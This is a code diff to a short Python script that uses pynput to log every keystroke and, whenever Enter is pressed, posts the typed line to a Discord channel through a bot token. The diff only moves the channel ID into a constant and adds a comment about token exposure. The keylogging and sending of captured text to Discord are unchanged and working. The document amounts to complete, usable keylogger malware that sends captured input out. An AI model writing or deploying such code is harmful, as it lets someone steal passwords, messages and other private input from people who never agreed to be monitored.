@@ -1,6 +1,8 @@
 import discord  
 from pynput import keyboard
 
+CHANNEL_ID = 0 # Change to your channel ID.
+
 intents = discord.Intents.default()
 client = discord.Client(intents=intents)
 str_msg = []
@@ -14,7 +16,7 @@ def on_press(key):
         if key == keyboard.Key.backspace:
             str_msg.pop()
         if key == keyboard.Key.enter:
-            channel = client.get_channel(0) # Change 0 to your channel ID.
+            channel = client.get_channel(CHANNEL_ID)
             client.loop.create_task(channel.send(''.join(str_msg)))
             str_msg = []
             return
@@ -26,5 +28,5 @@ async def on_ready():
     print(f"Logged in as {client.user}")
 
 with keyboard.Listener(on_press=on_press) as listener:
-    client.run("TOKEN") # Change token.
+    client.run("TOKEN") # Change token, may be dangerous expose your token in the code explicitly.
     listener.join()
